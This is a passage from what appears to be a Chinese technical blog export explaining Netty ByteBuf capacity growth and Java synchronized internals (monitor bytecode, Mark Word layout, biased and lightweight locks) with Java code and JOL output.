       System.out.println(byteBuf.readByte());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;byteBuf=&quot;</span> + byteBuf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (byteBuf2.hasArray()) &#123;</span><br><span class="line">            <span class="comment">// 获取ByteBuf中的字节数组</span></span><br><span class="line">            <span class="type">byte</span>[] content = byteBuf2.array();</span><br><span class="line">            <span class="comment">// 将字节数组转成字符串</span></span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(content, CharsetUtil.UTF_8));</span><br><span class="line">            System.out.println(<span class="string">&quot;byteBuf2=&quot;</span> + byteBuf2);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取字节数组0这个位置的字符的ascii码</span></span><br><span class="line">            System.out.println(byteBuf2.getByte(<span class="number">0</span>)); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// 可读的字节数，写指针减读指针的值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> byteBuf2.readableBytes(); </span><br><span class="line">            System.out.println(<span class="string">&quot;len=&quot;</span> + len);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 取出各个字节</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                System.out.println((<span class="type">char</span>) byteBuf2.getByte(i));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 范围读取</span></span><br><span class="line">            System.out.println(byteBuf2.getCharSequence(<span class="number">0</span>, <span class="number">6</span>, CharsetUtil.UTF_8));</span><br><span class="line">            System.out.println(byteBuf2.getCharSequence(<span class="number">6</span>, <span class="number">6</span>, CharsetUtil.UTF_8));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩容机制"><a href="#扩容机制" class="headerlink" title="扩容机制"></a>扩容机制</h3><p>ByteBuf有自己的扩容机制。从<code>writeBytes</code>写数据开始：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteBuf <span class="title function_">writeBytes</span><span class="params">(<span class="type">byte</span>[] src)</span> &#123;</span><br><span class="line">    writeBytes(src, <span class="number">0</span>, src.length);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ByteBuf <span class="title function_">writeBytes</span><span class="params">(<span class="type">byte</span>[] src, <span class="type">int</span> srcIndex, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用ensureWritable方法确保空间足够写入</span></span><br><span class="line">    ensureWritable(length);</span><br><span class="line">    setBytes(writerIndex, src, srcIndex, length);</span><br><span class="line">    writerIndex += length;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ByteBuf <span class="title function_">ensureWritable</span><span class="params">(<span class="type">int</span> minWritableBytes)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用ensureWritable0</span></span><br><span class="line">    ensureWritable0(checkPositiveOrZero(minWritableBytes, <span class="string">&quot;minWritableBytes&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">ensureWritable0</span><span class="params">(<span class="type">int</span> minWritableBytes)</span> &#123;</span><br><span class="line">    <span class="comment">// 当前已写位置</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">writerIndex</span> <span class="operator">=</span> writerIndex();</span><br><span class="line">    <span class="comment">// 当前数据写入后的长度</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">targetCapacity</span> <span class="operator">=</span> writerIndex + minWritableBytes;</span><br><span class="line">    <span class="comment">// 如果没有超过容量，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (targetCapacity &lt;= capacity()) &#123;</span><br><span class="line">        ensureAccessible();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果超过了容量，并且设置了checkBounds（io.netty.buffer.checkBounds）为true，直接抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (checkBounds &amp;&amp; targetCapacity &gt; maxCapacity) &#123;</span><br><span class="line">        ensureAccessible();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(String.format(</span><br><span class="line">                <span class="string">&quot;writerIndex(%d) + minWritableBytes(%d) exceeds maxCapacity(%d): %s&quot;</span>,</span><br><span class="line">                writerIndex, minWritableBytes, maxCapacity, <span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 得到可写长度</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">fastWritable</span> <span class="operator">=</span> maxFastWritableBytes();</span><br><span class="line">    <span class="comment">// 如果可写长度大于需要写入的长度</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> fastWritable &gt;= minWritableBytes ?</span><br><span class="line">   		      <span class="comment">// 如果还够写，长度不变</span></span><br><span class="line">              writerIndex + fastWritable </span><br><span class="line">              <span class="comment">// 否则调用AbstractByteBufAllocator的calculateNewCapacity进行扩容</span></span><br><span class="line">            : alloc().calculateNewCapacity(targetCapacity, maxCapacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adjust to the new capacity.</span></span><br><span class="line">    capacity(newCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AbstractByteBufAllocator的<code>calculateNewCapacity</code>方法进行扩容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calculateNewCapacity</span><span class="params">(<span class="type">int</span> minNewCapacity, <span class="type">int</span> maxCapacity)</span> &#123;</span><br><span class="line">    checkPositiveOrZero(minNewCapacity, <span class="string">&quot;minNewCapacity&quot;</span>);</span><br><span class="line">    <span class="comment">// 比最大值还大就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (minNewCapacity &gt; maxCapacity) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(String.format(</span><br><span class="line">                <span class="string">&quot;minNewCapacity: %d (expected: not greater than maxCapacity(%d)&quot;</span>,</span><br><span class="line">                minNewCapacity, maxCapacity));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置阈值为4MB</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">threshold</span> <span class="operator">=</span> CALCULATE_THRESHOLD; <span class="comment">// 4 MiB page</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果要扩容的长度恰好等于阈值就直接返回阈值</span></span><br><span class="line">    <span class="keyword">if</span> (minNewCapacity == threshold) &#123;</span><br><span class="line">        <span class="keyword">return</span> threshold;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果超过了阈值，每次扩容4MB</span></span><br><span class="line">    <span class="keyword">if</span> (minNewCapacity &gt; threshold) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> minNewCapacity / threshold * threshold;</span><br><span class="line">        <span class="keyword">if</span> (newCapacity &gt; maxCapacity - threshold) &#123;</span><br><span class="line">            newCapacity = maxCapacity;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newCapacity += threshold;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newCapacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没超过阈值，从64Byte开始成倍增长</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> (newCapacity &lt; minNewCapacity) &#123;</span><br><span class="line">        newCapacity &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Math.min(newCapacity, maxCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Netty的ByteBuf扩容过程如下：</p>
<ul>
<li>默认阈值为4MB（这个阈值是一个经验值，不同场景可能取值不同），当需要的容量等于阈值，使用阈值作为新的缓存区容量目标容量。</li>
<li>如果大于阈值，采用每次步进4MB的方式进行内存扩张，扩张后需要和最大内存（maxCapacity）进行比较，大于maxCapacity的话就用maxCapacity。</li>
<li>如果小于阈值，采用倍增的方式，以64Byte作为基本数值，每次翻倍增长，直到倍增后的结果大于或等于需要的容量值。+</li>
</ul>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>synchronized详解</title>
    <url>/2021/04/26/2021/synchronized%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="同步器"><a href="#同步器" class="headerlink" title="同步器"></a>同步器</h1><p>多线程编程中，可能出现多个线程同时访问同一个共享，可变资源的情况，这个资源我们称之为临界资源。</p>
<blockquote>
<p>共享：资源可以由多个线程同时访问</p>
</blockquote>
<blockquote>
<p>可变：资源可以在其生命周期内被修改</p>
</blockquote>
<p>由此，我们可以引出一个问题：</p>
<p>由于线程执行的过程是不可控的，所以需要采用同步机制来协同对象可变状态的访问。 </p>
<p>常见的解决线程并发安全问题的方式是<strong>序列化访问临界资源</strong></p>
<p>即在同一时刻只允许一个线程访问临界资源，也称作为同步互斥访问。</p>
<p>Java中提供了两种方式来实现同步互斥访问：<code>synchronized </code><strong>和</strong> <code>Lock</code></p>
<p>同步器的本质就是加锁，为了序列化访问临界资源</p>
<h1 id="synchronized原理详解"><a href="#synchronized原理详解" class="headerlink" title="synchronized原理详解"></a><strong>synchronized原理详解</strong></h1><p><strong>synchronized内置锁是一种对象锁(锁的是对象而非引用)，作用粒度是对象，可以用来实现对临界资源的同步互斥访问，是可重入的。</strong></p>
<p>加锁的方式：</p>
<p>1、同步实例方法，锁是当前实例对象</p>
<p>2、同步类方法，锁是当前类对象</p>
<p>3、同步代码块，锁是括号里面的对象</p>
<h2 id="Monitor监视器锁"><a href="#Monitor监视器锁" class="headerlink" title="Monitor监视器锁"></a><strong>Monitor监视器锁</strong></h2><p>任何一个对象都有一个Monitor与之关联，当且一个Monitor被持有后，它将处于锁定状态。</p>
<p>Synchronized在JVM里的实现都是 基于进入和退出Monitor对象来实现方法同步和代码块同步，虽然具体实现细节不一样，但是都可以通过成对的MonitorEnter和MonitorExit指令来实现。</p>
<h2 id="synchronized关键词的JVM指令"><a href="#synchronized关键词的JVM指令" class="headerlink" title="synchronized关键词的JVM指令"></a>synchronized关键词的JVM指令</h2><p>使用<code>synchronized</code>修饰代码块时，字节码后会被翻译成<strong>monitorenter</strong>和<strong>monitorexit</strong>两条指令分别在同步块逻辑代码的起始位置与结束位置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class version 51.0 (51)</span></span><br><span class="line"><span class="comment">// access flags 0x21</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Basic</span>/Thread1 &#123;</span><br><span class="line">  .........</span><br><span class="line">  <span class="comment">// access flags 0x9</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">main</span><span class="params">([Ljava/lang/String;)</span>V</span><br><span class="line">  ...........</span><br><span class="line">  <span class="comment">//!!!!!!!!!!!!!!</span></span><br><span class="line">    MONITORENTER</span><br><span class="line">   L0</span><br><span class="line">    LINENUMBER <span class="number">38</span> L0</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">&quot;\u9501\u8fdb\u5165wait\u7b49\u5f85\u4e4b\u524d\u7684\u4ee3\u7801&quot;</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V</span><br><span class="line">   L7</span><br><span class="line">    LINENUMBER <span class="number">39</span> L7</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">&quot;\u9501\u8fdb\u5165wait\u7b49\u5f85\u4e4b\u540e\u7684\u4ee3\u7801&quot;</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V</span><br><span class="line">   L8</span><br><span class="line">    LINENUMBER <span class="number">40</span> L8</span><br><span class="line">    ALOAD <span class="number">2</span></span><br><span class="line">    <span class="comment">//!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    MONITOREXIT</span><br><span class="line">   L1</span><br><span class="line">    GOTO L9</span><br><span class="line">   L2</span><br><span class="line">   FRAME FULL [[Ljava/lang/String; java/lang/String java/lang/Object] [java/lang/Throwable]</span><br><span class="line">    ASTORE <span class="number">3</span></span><br><span class="line">    ALOAD <span class="number">2</span></span><br><span class="line">    <span class="comment">//!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    MONITOREXIT</span><br><span class="line">   L3</span><br><span class="line">   ..........................</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这两条指令对于不同的锁会有不同的操作。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/prOyt8lGUSz5YLE.jpg"
                      alt="Screenshot_61.jpg"
                ></p>
<p><strong>monitorenter</strong>：</p>
<p>每个对象都是一个监视器锁（monitor）。当monitor被占用时就会处于锁定状态，线程执行monitorenter指令时尝试获取monitor的所有权，过程如下：</p>
<p>1、<strong>如果monitor的进入数为0</strong>，则该线程进入monitor，然后将进入数设置为1，该线程即为monitor的所有者；</p>
<p>2、<strong>如果线程已经占有该monitor</strong>，只是重新进入，则进入monitor的进入数加1；</p>
<p>3、<strong>如果其他线程已经占用了monitor</strong>，则该线程进入阻塞状态，直到monitor的进入数为0，再重新尝试获取monitor的所有权；</p>
<p><strong>monitorexit</strong>：</p>
<p>执行monitorexit的线程必须是object所对应的monitor的所有者。<strong>指令执行时，monitor的进入数减1，如果减1后进入数为0，那线程退出monitor，不再是这个monitor的所有者</strong>。其他被这个monitor阻塞的线程可以尝试去获取这个 monitor 的所有权。</p>
<p><strong>monitorexit，指令出现了两次，第1次为同步正常退出释放锁；第2次为发生异常退出释放锁</strong>；</p>
<p>通过上面两段描述，我们应该能很清楚的看出Synchronized的实现原理</p>
<p><strong>Synchronized的语义底层是通过一个monitor的对象来完成，其实wait&#x2F;notify等方法也依赖于monitor对象</strong>，这就是为什么只有在同步的块或者方法中才能调用wait&#x2F;notify等方法，<strong>否则会抛出<code>java.lang.IllegalMonitorStateException</code>的异常的原因</strong>。</p>
<p>而使用<code>synchronized</code>修饰方法时，JVM指令如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/04/zeLXxsqnD7rwHVk.jpg"
                      alt="Screenshot_60.jpg"
                ></p>
<h2 id="对象上的锁"><a href="#对象上的锁" class="headerlink" title="对象上的锁"></a>对象上的锁</h2><p>Synchronized一般有三种用法：</p>
<ol>
<li>锁类中的普通方法，锁的是当前实例对象(this)，多个实例对象对应多把锁</li>
<li>锁类中的静态方法，锁的是当前类的Class对象，只有唯一一把锁</li>
<li>锁类中普通方法的代码块，锁是<code>synchronized()</code>括号里面的对象，如果是静态对象只有唯一一把锁</li>
</ol>
<p>无论是哪种用法，锁的都是对象，那么到底怎么给一个Java对象加锁呢？</p>
<p>首先我们都知道<code>synchronized</code>是依靠Monitor进行加解锁的，而Monitor对象是存在于每个Java对象的对象头<code>Mark Word</code>中（存储的指针的指向）。</p>
<p><code>Synchronized</code>锁便是通过这种方式获取锁的，也是为什么Java中任意对象可以作为锁的原因，同时<code>notify/notifyAll/wait</code>等方法会使用到Monitor锁对象，所以必须在同步代码块中使用。</p>
<p>监视器Monitor有两种同步方式：互斥与协作。多线程环境下线程之间如果需要共享数据，需要解决互斥访问数据的问题，监视器可以确保监视器上的数据在同一时刻只会有一个线程在访问。</p>
<p>那么有个问题来了，我们知道synchronized加锁加在对象上，对象是如何记录锁状态的呢？</p>
<p><strong>答案是锁状态是被记录在每个对象的对象头（Mark Word）中，下面我们一起认识一下对象的内存布局</strong></p>
<h3 id="对象头结构"><a href="#对象头结构" class="headerlink" title="对象头结构"></a>对象头结构</h3><p>之前我们也介绍过，HotSpot虚拟机中，对象在内存中存储的布局可以分为三块区域，对象头（Header）、实例数据（Instance Data）和对齐填充（Padding）：<img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/VU7IMCfrcFkiSag.jpg"
                      alt="Screenshot_62.jpg"
                ></p>
<p>HotSpot虚拟机的<strong>对象头</strong>包括两部分信息</p>
<p>其中第一部分是<strong>Mark Word</strong>，用于存储对象自身的运行时数据， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等等，<strong>它是实现轻量级锁和偏向锁的关键</strong>。</p>
<p>这部分数据的长度在32位和64位的虚拟机中分别为32个和64个Bits</p>
<p>我们单以32位举例：</p>
<p>32位虚拟机的Mark Word</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/T6AR3LhsEocbiIj.jpg"
                      alt="Screenshot_64.jpg"
                ></p>
<p>Mark word确定了该对象的状态，我们可以通过上图看到，锁标志位为重量级锁的时候，才指向Monitor指针。</p>
<p>而在无锁  偏向锁  轻量级锁时，无锁状态时分代年龄等都记录在Markword</p>
<p>偏向锁的时候，就是线程ID和分代年龄等等。</p>
<p>那么锁升级的时候，那些信息大概是保存在其他地方了。</p>
<h2 id="锁升级"><a href="#锁升级" class="headerlink" title="锁升级"></a>锁升级</h2><p>在Mark Word字段表中，分别有无锁，偏向锁，轻量级锁和重量级锁，下面我们分别介绍。</p>
<h3 id="无锁"><a href="#无锁" class="headerlink" title="无锁"></a>无锁</h3><p>无锁状态对应Mark Word表中：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/27/eQr3bu7EfGqTgvk.jpg"
                      alt="Screenshot_54.jpg"
                ></p>
<p>无锁非常简单，一个对象在刚刚创建的时候它就是无锁状态：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Juc_PrintMarkWord</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="comment">//未出现任何获取锁的时候</span></span><br><span class="line">        System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对象头中的Mark Word内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 无锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION         VALUE</span><br><span class="line">    <span class="number">0</span>     <span class="number">4</span>     (object header)        <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000001</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">1</span>)</span><br><span class="line">    <span class="number">4</span>     <span class="number">4</span>     (object header)        <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>锁标志为对应的是<strong>001</strong>，表示没有锁。【小端模式</p>
<h3 id="偏向锁-单线程"><a href="#偏向锁-单线程" class="headerlink" title="偏向锁(单线程)"></a>偏向锁(单线程)</h3><p>偏向锁，顾名思义就是偏向第一个获取到锁对象的线程，并且在运行过程中，<strong>只有一个线程会访问同步代码块，不存在多线程的场景</strong>，这种情况下加的就是偏向锁。偏向锁状态对应Mark Word表中：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/27/WvV8EJPdKDNpjLa.jpg"
                      alt="Screenshot_55.jpg"
                ></p>
<p>可以看到当对象持有偏向锁时，对象头中记录了持有该偏向锁的线程ID。我们来演示一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Juc_PrintMarkWord</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="comment">//未出现任何获取锁的时候</span></span><br><span class="line">        System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">        <span class="keyword">synchronized</span> (o)&#123;</span><br><span class="line">            <span class="comment">// 获取一次锁之后</span></span><br><span class="line">            System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们预期的结果应该是第一次打印<strong>001</strong>，第二次打印<strong>101</strong>，可是结果却如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一次打印：无锁</span></span><br><span class="line"> OFFSET  SIZE   TYPE DESCRIPTION           VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>        (object header)       <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000001</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">1</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>        (object header)       <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 第二次打印：轻量级锁</span></span><br><span class="line"> OFFSET  SIZE   TYPE DESCRIPTION      VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)    <span class="number">18</span> f8 e5 <span class="number">02</span> (<span class="number">00011000</span> <span class="number">11111000</span> <span class="number">11100101</span> <span class="number">00000010</span>) (<span class="number">48625688</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>不对啊，为什么直接变成轻量级锁了？难道不应该是偏向锁吗？</p>
<p>这是由于java对于偏向锁的启动是在启动几秒之后才激活导致的，因为JVM启动的过程中会有大量的同步块，且这些同步块都有竞争，如果一启动就启动偏向锁，会出现很多没有必要的锁升级和撤销，因此JVM选择直接将其设置为轻量级锁。</p>
<p>我们可以通过参数<code>-XX:BiasedLockingStartupDelay=0</code>参数，将偏向锁启动延迟设置为0，我们再启动一次看看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一次打印：匿名偏向锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION       VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>       (object header)    <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000101</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">5</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>       (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次打印：偏向锁</span></span><br><span class="line">OFFSET  SIZE   TYPE DESCRIPTION      VALUE</span><br><span class="line">     <span class="number">0</span>     <span class="number">4</span>      (object header)    <span class="number">05</span> <span class="number">28</span> <span class="number">05</span> <span class="number">03</span> (<span class="number">00000101</span> <span class="number">00101000</span> <span class="number">00000101</span> <span class="number">00000011</span>) (<span class="number">50669573</span>)</span><br><span class="line">     <span class="number">4</span>     <span class="number">4</span>      (object header)    <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> (<span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>) (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到，JVM一开始就将对象状态设置为偏向锁，这是因为它检测到了我们后面可能会以该对象为锁产生线程竞争。不过我们可以发现一开始，其对象头中并没有保存线程ID，因为还没有线程获取锁，我们将其称为<strong>匿名偏向锁</strong>。</p>
<p>之后又一个线程对获取了该锁，于是该对象头中就会记录该线程的ID。另外，通过参数<code>-XX:-UseBiasedLocking</code>可以关闭偏向锁，默认开启。</p>
<p>经过研究发现，在大多数情况下，锁不仅不存在多线程竞争，而且总是由同一线程多次获得，因此为了减少同一线程获取锁(一些CAS操作)的代价而引入偏向锁。</p>
<p><strong>偏向锁的核心思想是：</strong></p>
<p>如果一个线程获得了锁，那么锁就进入偏向模式，此时Mark Word 的结构也变为偏向锁结构，当这个线程再次请求锁时， 无需再做任何同步操作，即获取锁的过程，这样就省去了大量有关锁申请的操作，从而也就提供程序的性能。所以，对于没有锁竞争的场合，偏向锁有很好的优化效果，毕竟极有可能连续多次是同一个线程申请相同的锁。</p>
<p>但是对于<strong>不止一个线程访问锁</strong>的场合(无论有没有竞争)，偏向锁就失效了，因为这样场合极有可能每次申请锁的线程都是不相同的，因此这种场合下不应该使用偏向锁，而是升级为轻量级锁，如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/Ci5YsZWc8pvU3Tw.jpg"
                      alt="Screenshot_65.jpg"
                ></p>
<p>当然，撤销偏向锁也是一个过程：需要在<strong>安全点</strong>暂停当前持有该偏向锁的线程，如果这时该线程还没有执行完同步代码块，则将锁升级为轻量级锁。</p>
<h3 id="轻量级锁-多个线程交替执行"><a href="#轻量级锁-多个线程交替执行" class="headerlink" title="轻量级锁(多个线程交替执行)"></a>轻量级锁(多个线程交替执行)</h3><p>倘若出现了多个线程，虚拟机并不会立即将锁升级为重量级锁，它还会尝试使用一种称为轻量级锁的优化手段，此时 Mark Word 的结构也变为轻量级锁的结构：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/dWYhmPCQ1SR5DnE.jpg"
                      alt="Screenshot_66.jpg"
                ></p>
<p>我们来演示一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Juc_PrintMarkWord</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="comment">// 未出现任何获取锁的时候</span></span><br><span class="line">        System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">	    <span class="comment">// 线程1获取锁</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (o)&#123;</span><br><span class="line">                System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 线程2获取锁</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (o)&#123;</span><br><span class="line">                System.out.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
